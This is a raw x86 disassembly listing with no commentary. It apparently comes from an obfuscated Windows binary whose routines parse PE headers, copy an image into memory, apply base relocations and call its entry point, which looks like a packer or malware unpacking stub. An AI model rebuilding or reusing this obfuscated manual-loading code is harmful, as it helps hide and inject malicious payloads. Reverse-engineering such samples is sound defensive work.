  41e0b3:	mov    BYTE PTR [ebp-0x1],al
  41e0b6:	mov    eax,DWORD PTR [ebp-0x8]
  41e0b9:	mov    ecx,DWORD PTR [ebp-0x18]
  41e0bc:	xor    eax,ebx
  41e0be:	add    eax,esi
  41e0c0:	imul   eax,ecx
  41e0c3:	mov    ecx,DWORD PTR [ebp-0x10]
  41e0c6:	xor    ecx,ebx
  41e0c8:	add    eax,ecx
  41e0ca:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e0cd:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41e0d5:	mov    ecx,DWORD PTR [ebp-0x9c]
  41e0db:	xor    ecx,ebx
  41e0dd:	lea    eax,[ecx+eax*1+0x3272e2]
  41e0e4:	movzx  ecx,BYTE PTR [ebp-0x1]
  41e0e8:	xor    ecx,eax
  41e0ea:	mov    BYTE PTR [ebp-0x1],cl
  41e0ed:	mov    al,BYTE PTR [ebp-0x1]
  41e0f0:	mov    ecx,DWORD PTR [ebp-0x8]
  41e0f3:	mov    edx,DWORD PTR [ebp-0x18]
  41e0f6:	xor    ecx,ebx
  41e0f8:	add    ecx,esi
  41e0fa:	imul   ecx,edx
  41e0fd:	mov    edx,DWORD PTR [ebp-0x1c]
  41e100:	mov    BYTE PTR [ecx+edx*1],al
  41e103:	mov    eax,DWORD PTR [ebp-0x34]
  41e106:	mov    ecx,DWORD PTR [ebp-0x10]
  41e109:	xor    eax,ebx
  41e10b:	xor    ecx,ebx
  41e10d:	add    eax,esi
  41e10f:	add    ecx,esi
  41e111:	imul   eax,ecx
  41e114:	add    eax,DWORD PTR [ebp-0x18]
  41e117:	mov    DWORD PTR [ebp-0x18],eax
  41e11a:	mov    eax,DWORD PTR [ebp-0x18]
  41e11d:	mov    ecx,DWORD PTR [ebp-0x20]
  41e120:	cmp    ecx,eax
  41e122:	jb     0x41e029
  41e128:	mov    eax,DWORD PTR [ebp-0x10]
  41e12b:	mov    ecx,DWORD PTR [ebp-0x20]
  41e12e:	xor    eax,ebx
  41e130:	add    eax,esi
  41e132:	imul   eax,ecx
  41e135:	mov    ecx,DWORD PTR [ebp-0x54]
  41e138:	xor    ecx,ebx
  41e13a:	add    ecx,esi
  41e13c:	or     eax,ecx
  41e13e:	mov    ecx,DWORD PTR [ebp-0x30]
  41e141:	xor    ecx,ebx
  41e143:	add    eax,ecx
  41e145:	mov    ecx,DWORD PTR [ebp-0x30]
  41e148:	xor    ecx,ebx
  41e14a:	add    eax,ecx
  41e14c:	mov    ecx,DWORD PTR [ebp-0xc]
  41e14f:	lea    eax,[eax+ecx*1+0x64e5c4]
  41e156:	jmp    0x41e167
  41e158:	mov    eax,DWORD PTR [ebp-0x30]
  41e15b:	mov    ecx,DWORD PTR [ebp-0xc]
  41e15e:	xor    eax,ebx
  41e160:	lea    eax,[eax+ecx*1+0x3272e2]
  41e167:	mov    DWORD PTR [ebp-0xc],eax
  41e16a:	mov    eax,DWORD PTR [ebp-0x30]
  41e16d:	xor    eax,ebx
  41e16f:	mov    ecx,0xffcd8d1e
  41e174:	sub    ecx,eax
  41e176:	add    ecx,DWORD PTR [ebp-0x38]
  41e179:	mov    eax,DWORD PTR [ebp-0x30]
  41e17c:	mov    edx,DWORD PTR [ebp-0xc]
  41e17f:	xor    eax,ebx
  41e181:	add    eax,esi
  41e183:	imul   eax,edx
  41e186:	cmp    eax,ecx
  41e188:	jbe    0x41dfa3
  41e18e:	push   DWORD PTR [ebp+0x8]
  41e191:	mov    eax,DWORD PTR [ebp+0x8]
  41e194:	push   DWORD PTR [eax+0x1cc]
  41e19a:	lea    eax,[ebp-0xa0]
  41e1a0:	push   eax
  41e1a1:	mov    eax,DWORD PTR [ebp+0x8]
  41e1a4:	mov    eax,DWORD PTR [eax+0x1c4]
  41e1aa:	push   DWORD PTR [eax]
  41e1ac:	mov    eax,DWORD PTR [ebp+0x8]
  41e1af:	mov    eax,DWORD PTR [eax+0x1c0]
  41e1b5:	push   DWORD PTR [eax]
  41e1b7:	push   DWORD PTR [ebp-0x3c]
  41e1ba:	push   DWORD PTR [ebp-0x2c]
  41e1bd:	call   0x41ec54
  41e1c2:	mov    DWORD PTR [ebp-0x40],eax
  41e1c5:	mov    eax,DWORD PTR [ebp-0x14]
  41e1c8:	mov    ecx,DWORD PTR [ebp-0x2c]
  41e1cb:	xor    eax,ebx
  41e1cd:	add    eax,esi
  41e1cf:	cmp    eax,ecx
  41e1d1:	je     0x41e1f2
  41e1d3:	mov    eax,DWORD PTR [ebp+0x8]
  41e1d6:	mov    ecx,DWORD PTR [ebp-0x50]
  41e1d9:	mov    eax,DWORD PTR [eax+0x1d8]
  41e1df:	xor    ecx,ebx
  41e1e1:	add    ecx,esi
  41e1e3:	push   ecx
  41e1e4:	mov    ecx,DWORD PTR [ebp-0x14]
  41e1e7:	xor    ecx,ebx
  41e1e9:	add    ecx,esi
  41e1eb:	push   ecx
  41e1ec:	push   DWORD PTR [ebp-0x2c]
  41e1ef:	call   DWORD PTR [eax+0x18]
  41e1f2:	pop    edi
  41e1f3:	pop    esi
  41e1f4:	pop    ebx
  41e1f5:	leave  
  41e1f6:	ret    0x4
  41e1f9:	push   ebp
  41e1fa:	mov    ebp,esp
  41e1fc:	push   ecx
  41e1fd:	push   ecx
  41e1fe:	lea    eax,[ebp-0x8]
  41e201:	mov    DWORD PTR [ebp-0x4],eax
  41e204:	push   esi
  41e205:	mov    esi,DWORD PTR [ebp-0x4]
  41e208:	mov    eax,0xf881ba0f
  41e20d:	mov    DWORD PTR [esi],eax
  41e20f:	mov    esi,DWORD PTR [ebp-0x8]
  41e212:	cmp    esi,eax
  41e214:	pop    esi
  41e215:	jne    0x41e21f
  41e217:	mov    BYTE PTR [ecx+0xa],0x7c
  41e21b:	mov    BYTE PTR [edx+0x8],0x2f
  41e21f:	mov    BYTE PTR [edx+0xa],0x7c
  41e223:	mov    BYTE PTR [ecx+0x2],0x2
  41e227:	leave  
  41e228:	ret    
  41e229:	push   ebp
  41e22a:	mov    ebp,esp
  41e22c:	push   ecx
  41e22d:	push   ecx
  41e22e:	lea    eax,[ebp-0x8]
  41e231:	mov    DWORD PTR [ebp-0x4],eax
  41e234:	mov    edx,DWORD PTR [ebp-0x4]
  41e237:	mov    eax,0xf88b0be3
  41e23c:	mov    DWORD PTR [edx],eax
  41e23e:	mov    edx,DWORD PTR [ebp-0x8]
  41e241:	cmp    edx,eax
  41e243:	jne    0x41e254
  41e245:	mov    eax,DWORD PTR [ebp+0x8]
  41e248:	mov    BYTE PTR [ecx+0x9],0x8
  41e24c:	mov    BYTE PTR [eax+0x7],0x47
  41e250:	mov    BYTE PTR [ecx+0x6],0xf
  41e254:	mov    BYTE PTR [ecx+0x3],0x18
  41e258:	leave  
  41e259:	ret    0x4
  41e25c:	push   ebp
  41e25d:	mov    ebp,esp
  41e25f:	push   ecx
  41e260:	push   ecx
  41e261:	lea    eax,[ebp-0x8]
  41e264:	mov    DWORD PTR [ebp-0x4],eax
  41e267:	mov    edx,DWORD PTR [ebp-0x4]
  41e26a:	mov    eax,0x7e0da0f
  41e26f:	mov    DWORD PTR [edx],eax
  41e271:	mov    edx,DWORD PTR [ebp-0x8]
  41e274:	cmp    edx,eax
  41e276:	jne    0x41e27c
  41e278:	mov    BYTE PTR [ecx+0x7],0x47
  41e27c:	mov    eax,DWORD PTR [ebp+0x8]
  41e27f:	mov    BYTE PTR [ecx+0x1],0x5
  41e283:	mov    BYTE PTR [eax+0x9],0x28
  41e287:	leave  
  41e288:	ret    0x4
  41e28b:	push   ebp
  41e28c:	mov    ebp,esp
  41e28e:	push   ecx
  41e28f:	push   ecx
  41e290:	lea    eax,[ebp-0x8]
  41e293:	mov    DWORD PTR [ebp-0x4],eax
  41e296:	push   esi
  41e297:	mov    esi,DWORD PTR [ebp-0x4]
  41e29a:	mov    eax,0x7060e3e
  41e29f:	mov    DWORD PTR [esi],eax
  41e2a1:	mov    esi,DWORD PTR [ebp-0x8]
  41e2a4:	cmp    esi,eax
  41e2a6:	pop    esi
  41e2a7:	jne    0x41e2b3
  41e2a9:	mov    BYTE PTR [edx+0x4],0x3
  41e2ad:	mov    WORD PTR [ecx+0x3],0x318
  41e2b3:	mov    BYTE PTR [edx],0x3f
  41e2b6:	leave  
  41e2b7:	ret    
  41e2b8:	push   ebp
  41e2b9:	mov    ebp,esp
  41e2bb:	push   ecx
  41e2bc:	push   ecx
  41e2bd:	lea    eax,[ebp-0x8]
  41e2c0:	mov    DWORD PTR [ebp-0x4],eax
  41e2c3:	mov    edx,DWORD PTR [ebp-0x4]
  41e2c6:	mov    eax,0xf8870b3f
  41e2cb:	mov    DWORD PTR [edx],eax
  41e2cd:	mov    edx,DWORD PTR [ebp-0x8]
  41e2d0:	cmp    edx,eax
  41e2d2:	jne    0x41e2df
  41e2d4:	mov    eax,DWORD PTR [ebp+0x8]
  41e2d7:	mov    BYTE PTR [ecx+0x8],0xf
  41e2db:	mov    BYTE PTR [eax+0x1],0x5
  41e2df:	mov    BYTE PTR [ecx+0x5],0xb
  41e2e3:	leave  
  41e2e4:	ret    0x4
  41e2e7:	push   esi
  41e2e8:	mov    ecx,edi
  41e2ea:	call   0x41e2b8
  41e2ef:	mov    edx,edi
  41e2f1:	mov    ecx,esi
  41e2f3:	mov    BYTE PTR [esi],0x1f
  41e2f6:	call   0x41e28b
  41e2fb:	push   esi
  41e2fc:	mov    ecx,edi
  41e2fe:	mov    BYTE PTR [esi+0x5],0xb
  41e302:	call   0x41e25c
  41e307:	push   esi
  41e308:	mov    BYTE PTR [esi+0x6],0xf
  41e30c:	call   0x41e229
  41e311:	mov    BYTE PTR [esi+0x2],0x2
  41e315:	mov    edx,esi
  41e317:	jmp    0x41e1f9
  41e31c:	push   ebp
  41e31d:	mov    ebp,esp
  41e31f:	push   ecx
  41e320:	mov    ecx,DWORD PTR [edx+0x194]
  41e326:	push   esi
  41e327:	mov    esi,DWORD PTR [ebp+0x8]
  41e32a:	mov    esi,DWORD PTR [esi]
  41e32c:	mov    DWORD PTR [ecx],esi
  41e32e:	mov    ecx,DWORD PTR [edx+0x194]
  41e334:	mov    ecx,DWORD PTR [ecx]
  41e336:	mov    esi,DWORD PTR [edx+0x190]
  41e33c:	mov    DWORD PTR [esi],ecx
  41e33e:	mov    eax,DWORD PTR [edx+0x194]
  41e344:	mov    ecx,DWORD PTR [eax]
  41e346:	mov    ecx,DWORD PTR [ecx+0x3c]
  41e349:	add    ecx,DWORD PTR [eax]
  41e34b:	mov    DWORD PTR [ebp-0x4],0xf89ca585
  41e352:	mov    eax,DWORD PTR [ebp-0x4]
  41e355:	movzx  ecx,WORD PTR [ecx+0x16]
  41e359:	xor    eax,0x751089b
  41e35e:	add    eax,0x3272e2
  41e363:	pop    esi
  41e364:	test   ecx,eax
  41e366:	je     0x41e374
  41e368:	mov    eax,DWORD PTR [edx+0x1c8]
  41e36e:	mov    DWORD PTR [eax],0xf89c8584
  41e374:	leave  
  41e375:	ret    0x4
  41e378:	push   ebp
  41e379:	mov    ebp,esp
  41e37b:	sub    esp,0x70
  41e37e:	and    DWORD PTR [ebp-0x20],0x0
  41e382:	mov    DWORD PTR [ebp-0x18],0xf89cb585
  41e389:	mov    DWORD PTR [ebp-0x1c],0xf89c85c5
  41e390:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  41e397:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  41e39e:	mov    DWORD PTR [ebp-0x2c],0xf89f0585
  41e3a5:	mov    eax,DWORD PTR [ebp+0x20]
  41e3a8:	mov    eax,DWORD PTR [eax+0x194]
  41e3ae:	mov    DWORD PTR [ebp-0xc],eax
  41e3b1:	mov    eax,DWORD PTR [ebp+0x20]
  41e3b4:	push   ebx
  41e3b5:	push   esi
  41e3b6:	mov    esi,DWORD PTR [eax+0x190]
  41e3bc:	mov    eax,DWORD PTR [ebp+0x20]
  41e3bf:	mov    eax,DWORD PTR [eax+0x18c]
  41e3c5:	mov    DWORD PTR [ebp-0x8],eax
  41e3c8:	mov    eax,DWORD PTR [eax]
  41e3ca:	push   edi
  41e3cb:	mov    DWORD PTR [ebp-0x4],esi
  41e3ce:	test   eax,eax
  41e3d0:	jne    0x41e3dd
  41e3d2:	push   DWORD PTR [ebp+0x1c]
  41e3d5:	mov    edx,DWORD PTR [ebp+0x20]
  41e3d8:	call   0x41e31c
  41e3dd:	mov    eax,DWORD PTR [esi]
  41e3df:	mov    ebx,DWORD PTR [esi]
  41e3e1:	add    ebx,DWORD PTR [eax+0x3c]
  41e3e4:	mov    eax,DWORD PTR [ebp+0xc]
  41e3e7:	mov    ecx,DWORD PTR [ebp-0x8]
  41e3ea:	mov    ecx,DWORD PTR [ecx]
  41e3ec:	mov    esi,0x751089b
  41e3f1:	xor    eax,esi
  41e3f3:	mov    edi,0x3272e2
  41e3f8:	add    eax,edi
  41e3fa:	cmp    eax,ecx
  41e3fc:	jne    0x41e634
  41e402:	mov    eax,DWORD PTR [ebp-0xc]
  41e405:	mov    eax,DWORD PTR [eax]
  41e407:	mov    DWORD PTR [ebp-0x10],eax
  41e40a:	mov    eax,DWORD PTR [ebx+0x50]
  41e40d:	mov    DWORD PTR [ebp-0x68],eax
  41e410:	mov    eax,DWORD PTR [ebp-0x18]
  41e413:	xor    eax,esi
  41e415:	add    eax,edi
  41e417:	mov    DWORD PTR [ebp-0x64],eax
  41e41a:	mov    eax,DWORD PTR [ebp-0x14]
  41e41d:	and    DWORD PTR [ebp-0x6c],0x0
  41e421:	xor    eax,esi
  41e423:	add    eax,edi
  41e425:	mov    DWORD PTR [ebp-0x60],eax
  41e428:	lea    eax,[ebp-0x70]
  41e42b:	push   eax
  41e42c:	mov    eax,DWORD PTR [ebp+0x8]
  41e42f:	xor    eax,esi
  41e431:	add    eax,edi
  41e433:	push   eax
  41e434:	mov    eax,DWORD PTR [ebp+0x20]
  41e437:	add    eax,0xaa
  41e43c:	push   eax
  41e43d:	mov    eax,DWORD PTR [ebp+0x20]
  41e440:	mov    eax,DWORD PTR [eax+0x198]
  41e446:	mov    DWORD PTR [ebp-0x70],0x4
  41e44d:	push   DWORD PTR [eax]
  41e44f:	mov    eax,DWORD PTR [ebp+0x10]
  41e452:	call   eax
  41e454:	mov    ecx,DWORD PTR [ebp-0xc]
  41e457:	mov    ecx,DWORD PTR [ecx]
  41e459:	mov    edx,DWORD PTR [ebp-0x8]
  41e45c:	mov    DWORD PTR [ebp-0x6c],eax
  41e45f:	mov    DWORD PTR [ebp+0x1c],eax
  41e462:	mov    DWORD PTR [edx],ecx
  41e464:	mov    ecx,DWORD PTR [ebp-0x4]
  41e467:	mov    DWORD PTR [ecx],eax
  41e469:	mov    eax,DWORD PTR [ebx+0x50]
  41e46c:	mov    DWORD PTR [ebp-0x68],eax
  41e46f:	mov    eax,DWORD PTR [ebp-0x1c]
  41e472:	xor    eax,esi
  41e474:	add    eax,edi
  41e476:	mov    DWORD PTR [ebp-0x64],eax
  41e479:	lea    eax,[ebp-0x20]
  41e47c:	mov    DWORD PTR [ebp-0x60],eax
  41e47f:	lea    eax,[ebp-0x70]
  41e482:	push   eax
  41e483:	mov    eax,DWORD PTR [ebp+0x8]
  41e486:	xor    eax,esi
  41e488:	add    eax,edi
  41e48a:	push   eax
  41e48b:	mov    eax,DWORD PTR [ebp+0x20]
  41e48e:	add    eax,0xee
  41e493:	push   eax
  41e494:	mov    eax,DWORD PTR [ebp+0x20]
  41e497:	mov    eax,DWORD PTR [eax+0x198]
  41e49d:	mov    DWORD PTR [ebp-0x70],0x4
  41e4a4:	push   DWORD PTR [eax]
  41e4a6:	mov    eax,DWORD PTR [ebp+0x10]
  41e4a9:	call   eax
  41e4ab:	test   eax,eax
  41e4ad:	je     0x41e4d2
  41e4af:	and    DWORD PTR [ebp+0xc],0x0
  41e4b3:	cmp    DWORD PTR [ebx+0x50],0x0
  41e4b7:	jbe    0x41e4d2
  41e4b9:	mov    eax,DWORD PTR [ebp+0x1c]
  41e4bc:	mov    ecx,DWORD PTR [ebp-0x10]
  41e4bf:	sub    ecx,eax
  41e4c1:	mov    dl,BYTE PTR [ecx+eax*1]
  41e4c4:	inc    DWORD PTR [ebp+0xc]
  41e4c7:	mov    BYTE PTR [eax],dl
  41e4c9:	mov    edx,DWORD PTR [ebp+0xc]
  41e4cc:	inc    eax
  41e4cd:	cmp    edx,DWORD PTR [ebx+0x50]
  41e4d0:	jb     0x41e4c1
  41e4d2:	mov    edx,DWORD PTR [ebp+0x1c]
  41e4d5:	mov    ecx,DWORD PTR [edx+0x3c]
  41e4d8:	add    ecx,edx
  41e4da:	mov    eax,DWORD PTR [ecx+0xa0]
  41e4e0:	mov    ebx,DWORD PTR [ecx+0x28]
  41e4e3:	add    eax,edx
  41e4e5:	sub    edx,DWORD PTR [ebp-0x10]
  41e4e8:	add    ebx,DWORD PTR [ebp+0x1c]
  41e4eb:	mov    DWORD PTR [ebp+0xc],edx
  41e4ee:	mov    DWORD PTR [ebp-0x2c],ecx
  41e4f1:	mov    DWORD PTR [ebp-0x14],ebx
  41e4f4:	mov    DWORD PTR [ebp-0x8],0x0
  41e4fb:	jmp    0x41e577
  41e4fd:	add    edx,0xfffffff8
  41e500:	shr    edx,1
  41e502:	mov    DWORD PTR [ebp-0x18],edx
  41e505:	je     0x41e563
  41e507:	lea    edx,[eax+0x8]
  41e50a:	mov    DWORD PTR [ebp-0x4],edx
  41e50d:	mov    edx,DWORD PTR [ebp-0x18]
  41e510:	mov    DWORD PTR [ebp-0x18],edx
  41e513:	mov    edx,DWORD PTR [ebp-0x4]
  41e516:	movzx  edx,WORD PTR [edx]
  41e519:	mov    DWORD PTR [ebp-0x24],edx
  41e51c:	and    edx,0xfff
  41e522:	mov    DWORD PTR [ebp-0x28],edx
  41e525:	mov    edx,DWORD PTR [ebp-0x24]
  41e528:	shr    edx,0xc
  41e52b:	add    edx,0xffcd8d1e
  41e531:	xor    edx,esi
  41e533:	cmp    edx,0xf89c85ba
  41e539:	jne    0x41e55a
  41e53b:	mov    edx,DWORD PTR [ebp-0x28]
  41e53e:	add    edx,DWORD PTR [ebp+0x1c]
  41e541:	mov    ebx,DWORD PTR [eax]
  41e543:	cmp    DWORD PTR [ebx+edx*1],0x0
  41e547:	je     0x41e557
  41e549:	mov    ecx,DWORD PTR [ebp+0xc]
  41e54c:	add    ecx,DWORD PTR [ebx+edx*1]
  41e54f:	mov    ebx,DWORD PTR [eax]
  41e551:	mov    DWORD PTR [edx+ebx*1],ecx
  41e554:	mov    ecx,DWORD PTR [ebp-0x2c]
  41e557:	mov    ebx,DWORD PTR [ebp-0x14]
  41e55a:	add    DWORD PTR [ebp-0x4],0x2
  41e55e:	dec    DWORD PTR [ebp-0x18]
  41e561:	jne    0x41e513
  41e563:	mov    edx,DWORD PTR [ebp-0xc]
  41e566:	add    DWORD PTR [ebp-0x8],edx
  41e569:	mov    edx,DWORD PTR [ebp-0x8]
  41e56c:	cmp    edx,DWORD PTR [ecx+0xa4]
  41e572:	jae    0x41e585
  41e574:	add    eax,DWORD PTR [ebp-0xc]
  41e577:	mov    edx,DWORD PTR [eax+0x4]
  41e57a:	mov    DWORD PTR [ebp-0xc],edx
  41e57d:	test   edx,edx
  41e57f:	jne    0x41e4fd
  41e585:	mov    eax,DWORD PTR [ebp-0x10]
  41e588:	mov    DWORD PTR [ebp-0x6c],eax
  41e58b:	mov    DWORD PTR [ebp-0x70],0x4
  41e592:	mov    eax,DWORD PTR [ecx+0x50]
  41e595:	mov    DWORD PTR [ebp-0x68],eax
  41e598:	mov    eax,DWORD PTR [ebp-0x1c]
  41e59b:	xor    eax,esi
  41e59d:	add    eax,edi
  41e59f:	mov    DWORD PTR [ebp-0x64],eax
  41e5a2:	lea    eax,[ebp-0x20]
  41e5a5:	mov    DWORD PTR [ebp-0x60],eax
  41e5a8:	lea    eax,[ebp-0x70]
  41e5ab:	push   eax
  41e5ac:	mov    eax,DWORD PTR [ebp+0x8]
  41e5af:	xor    eax,esi
  41e5b1:	add    eax,edi
  41e5b3:	push   eax
  41e5b4:	mov    eax,DWORD PTR [ebp+0x20]
  41e5b7:	add    eax,0xee
  41e5bc:	push   eax
  41e5bd:	mov    eax,DWORD PTR [ebp+0x20]
  41e5c0:	mov    eax,DWORD PTR [eax+0x198]
  41e5c6:	push   DWORD PTR [eax]
  41e5c8:	mov    eax,DWORD PTR [ebp+0x10]
  41e5cb:	call   eax
  41e5cd:	mov    eax,DWORD PTR [ebp+0x20]
  41e5d0:	mov    eax,DWORD PTR [eax+0x180]
  41e5d6:	add    eax,DWORD PTR [ebp+0xc]
  41e5d9:	mov    ecx,DWORD PTR [ebp+0xc]
  41e5dc:	push   DWORD PTR [ebp+0x18]
  41e5df:	mov    DWORD PTR [eax],ecx
  41e5e1:	push   DWORD PTR [ebp+0x14]
  41e5e4:	push   DWORD PTR [ebp+0x1c]
  41e5e7:	call   ebx
  41e5e9:	mov    ecx,DWORD PTR [ebp+0xc]
  41e5ec:	add    ecx,DWORD PTR [ebp+0x20]
  41e5ef:	lea    eax,[ebp+0x4]
  41e5f2:	mov    DWORD PTR [ebp+0x20],ecx
  41e5f5:	mov    ecx,DWORD PTR [ebp+0x20]
  41e5f8:	mov    ecx,DWORD PTR [ebp+0x20]
  41e5fb:	mov    edx,DWORD PTR [ecx+0x190]
  41e601:	mov    ecx,DWORD PTR [ebp+0x20]
  41e604:	mov    ecx,DWORD PTR [ecx+0x18c]
  41e60a:	mov    esi,DWORD PTR [ecx]
  41e60c:	cmp    DWORD PTR [eax],esi
  41e60e:	jb     0x41e62f
  41e610:	mov    esi,DWORD PTR [edx]
  41e612:	mov    edi,DWORD PTR [edx]
  41e614:	mov    esi,DWORD PTR [esi+0x3c]
  41e617:	lea    esi,[edi+esi*1+0x50]
  41e61b:	mov    edi,DWORD PTR [ecx]
  41e61d:	add    edi,DWORD PTR [esi]
  41e61f:	cmp    DWORD PTR [eax],edi
  41e621:	jae    0x41e62f
  41e623:	mov    esi,DWORD PTR [ecx]
  41e625:	mov    ecx,DWORD PTR [eax]
  41e627:	mov    edx,DWORD PTR [edx]
  41e629:	sub    ecx,esi
  41e62b:	add    edx,ecx
  41e62d:	mov    DWORD PTR [eax],edx
  41e62f:	mov    eax,DWORD PTR [ebp+0xc]
  41e632:	jmp    0x41e636
  41e634:	xor    eax,eax
  41e636:	pop    edi
  41e637:	pop    esi
  41e638:	pop    ebx
  41e639:	leave  
  41e63a:	ret    0x1c
  41e63d:	push   ebp
  41e63e:	mov    ebp,esp
  41e640:	sub    esp,0x1c
  41e643:	push   esi
  41e644:	mov    esi,eax
  41e646:	mov    eax,DWORD PTR [ecx+0x190]
  41e64c:	cmp    DWORD PTR [eax],0x0
  41e64f:	je     0x41e75f
  41e655:	test   edx,edx
  41e657:	je     0x41e75f
  41e65d:	test   esi,esi
  41e65f:	je     0x41e75f
  41e665:	mov    eax,DWORD PTR [esi+0x88]
  41e66b:	test   eax,eax
  41e66d:	je     0x41e75a
  41e673:	cmp    DWORD PTR [esi+0x8c],0x10
  41e67a:	je     0x41e75a
  41e680:	cmp    DWORD PTR [esi+0x34],edx
  41e683:	je     0x41e75a
  41e689:	mov    esi,DWORD PTR [ecx+0x18c]
  41e68f:	and    DWORD PTR [ebp-0x10],0x0
  41e693:	mov    ecx,edx
  41e695:	sub    ecx,DWORD PTR [esi]
  41e697:	add    eax,edx
  41e699:	movzx  edx,WORD PTR [eax+0xc]
  41e69d:	mov    DWORD PTR [ebp-0x1c],ecx
  41e6a0:	movzx  ecx,WORD PTR [eax+0xe]
  41e6a4:	add    ecx,edx
  41e6a6:	je     0x41e75a
  41e6ac:	lea    ecx,[eax+0x14]
  41e6af:	push   ebx
  41e6b0:	mov    DWORD PTR [ebp-0x18],ecx
  41e6b3:	mov    esi,0x7fffffff
  41e6b8:	push   edi
  41e6b9:	test   DWORD PTR [ecx],esi
  41e6bb:	je     0x41e73c
  41e6bd:	mov    edx,DWORD PTR [ecx]
  41e6bf:	and    DWORD PTR [ebp-0xc],0x0
  41e6c3:	and    edx,esi
  41e6c5:	add    edx,eax
  41e6c7:	movzx  edi,WORD PTR [edx+0xe]
  41e6cb:	movzx  ebx,WORD PTR [edx+0xc]
  41e6cf:	add    edi,ebx
  41e6d1:	je     0x41e73c
  41e6d3:	lea    ecx,[edx+0x14]
  41e6d6:	mov    DWORD PTR [ebp-0x14],ecx
  41e6d9:	test   DWORD PTR [ecx],esi
  41e6db:	je     0x41e71e
  41e6dd:	mov    ecx,DWORD PTR [ecx]
  41e6df:	and    DWORD PTR [ebp-0x8],0x0
  41e6e3:	and    ecx,esi
  41e6e5:	add    ecx,eax
  41e6e7:	movzx  edi,WORD PTR [ecx+0xe]
  41e6eb:	movzx  ebx,WORD PTR [ecx+0xc]
  41e6ef:	add    edi,ebx
  41e6f1:	je     0x41e71e
  41e6f3:	lea    edi,[ecx+0x14]
  41e6f6:	mov    DWORD PTR [ebp-0x4],edi
  41e6f9:	mov    edi,DWORD PTR [ebp-0x4]
  41e6fc:	mov    edi,DWORD PTR [edi]
  41e6fe:	test   edi,edi
  41e700:	je     0x41e708
  41e702:	mov    ebx,DWORD PTR [ebp-0x1c]
  41e705:	add    DWORD PTR [edi+eax*1],ebx
  41e708:	movzx  edi,WORD PTR [ecx+0xe]
  41e70c:	movzx  ebx,WORD PTR [ecx+0xc]
  41e710:	inc    DWORD PTR [ebp-0x8]
  41e713:	add    DWORD PTR [ebp-0x4],0x8
  41e717:	add    edi,ebx
  41e719:	cmp    DWORD PTR [ebp-0x8],edi
  41e71c:	jb     0x41e6f9
  41e71e:	movzx  edi,WORD PTR [edx+0xe]
  41e722:	movzx  ebx,WORD PTR [edx+0xc]
  41e726:	mov    ecx,DWORD PTR [ebp-0x14]
  41e729:	inc    DWORD PTR [ebp-0xc]
  41e72c:	add    ecx,0x8
  41e72f:	add    edi,ebx
  41e731:	mov    DWORD PTR [ebp-0x14],ecx
  41e734:	cmp    DWORD PTR [ebp-0xc],edi
  41e737:	jb     0x41e6d9
  41e739:	mov    ecx,DWORD PTR [ebp-0x18]
  41e73c:	movzx  edx,WORD PTR [eax+0xe]
  41e740:	movzx  edi,WORD PTR [eax+0xc]
  41e744:	inc    DWORD PTR [ebp-0x10]
  41e747:	add    ecx,0x8
  41e74a:	add    edx,edi
  41e74c:	mov    DWORD PTR [ebp-0x18],ecx
  41e74f:	cmp    DWORD PTR [ebp-0x10],edx
  41e752:	jb     0x41e6b9
  41e758:	pop    edi
  41e759:	pop    ebx
  41e75a:	xor    eax,eax
  41e75c:	inc    eax
  41e75d:	jmp    0x41e761
  41e75f:	xor    eax,eax
  41e761:	pop    esi
  41e762:	leave  
  41e763:	ret    
  41e764:	push   ebp
  41e765:	mov    ebp,esp
  41e767:	mov    ecx,DWORD PTR [ecx+0x190]
  41e76d:	mov    eax,DWORD PTR [ebp+0xc]
  41e770:	sub    esp,0x10
  41e773:	push   ebx
  41e774:	xor    ebx,ebx
  41e776:	push   esi
  41e777:	push   edi
  41e778:	cmp    DWORD PTR [ecx],ebx
  41e77a:	je     0x41e802
  41e780:	cmp    eax,ebx
  41e782:	je     0x41e802
  41e784:	cmp    DWORD PTR [eax+0x78],ebx
  41e787:	jne    0x41e78e
  41e789:	xor    eax,eax
  41e78b:	inc    eax
  41e78c:	jmp    0x41e804
  41e78e:	mov    eax,DWORD PTR [eax+0x78]
  41e791:	add    eax,DWORD PTR [ebp+0x8]
  41e794:	mov    ecx,DWORD PTR [eax+0x1c]
  41e797:	mov    edx,DWORD PTR [eax+0x24]
  41e79a:	mov    esi,DWORD PTR [eax+0x14]
  41e79d:	mov    edi,DWORD PTR [eax+0x18]
  41e7a0:	add    ecx,DWORD PTR [ebp+0x8]
  41e7a3:	add    edx,DWORD PTR [ebp+0x8]
  41e7a6:	mov    DWORD PTR [ebp-0x4],esi
  41e7a9:	cmp    esi,edi
  41e7ab:	ja     0x41e7b0
  41e7ad:	mov    DWORD PTR [ebp-0x4],edi
  41e7b0:	mov    DWORD PTR [ebp-0x8],ebx
  41e7b3:	cmp    DWORD PTR [ebp-0x4],ebx
  41e7b6:	jbe    0x41e789
  41e7b8:	cmp    ebx,DWORD PTR [eax+0x14]
  41e7bb:	jae    0x41e7c3
  41e7bd:	movzx  esi,WORD PTR [edx+ebx*2]
  41e7c1:	jmp    0x41e7c5
  41e7c3:	mov    esi,ebx
  41e7c5:	lea    esi,[ecx+esi*4]
  41e7c8:	mov    edi,DWORD PTR [esi]
  41e7ca:	test   edi,edi
  41e7cc:	je     0x41e7f7
  41e7ce:	add    edi,DWORD PTR [ebp+0x8]
  41e7d1:	mov    DWORD PTR [ebp-0x10],edi
  41e7d4:	cmp    edi,eax
  41e7d6:	jbe    0x41e7e8
  41e7d8:	mov    ebx,DWORD PTR [ebp+0xc]
  41e7db:	mov    ebx,DWORD PTR [ebx+0x7c]
  41e7de:	add    ebx,eax
  41e7e0:	cmp    edi,ebx
  41e7e2:	jae    0x41e7e8
  41e7e4:	mov    esi,DWORD PTR [esi]
  41e7e6:	jmp    0x41e7f0
  41e7e8:	sub    edi,DWORD PTR [ebp+0x8]
  41e7eb:	mov    DWORD PTR [esi],edi
  41e7ed:	mov    esi,DWORD PTR [ebp-0x10]
  41e7f0:	test   esi,esi
  41e7f2:	je     0x41e802
  41e7f4:	mov    ebx,DWORD PTR [ebp-0x8]
  41e7f7:	inc    ebx
  41e7f8:	mov    DWORD PTR [ebp-0x8],ebx
  41e7fb:	cmp    ebx,DWORD PTR [ebp-0x4]
  41e7fe:	jb     0x41e7b8
  41e800:	jmp    0x41e789
  41e802:	xor    eax,eax
  41e804:	pop    edi
  41e805:	pop    esi
  41e806:	pop    ebx
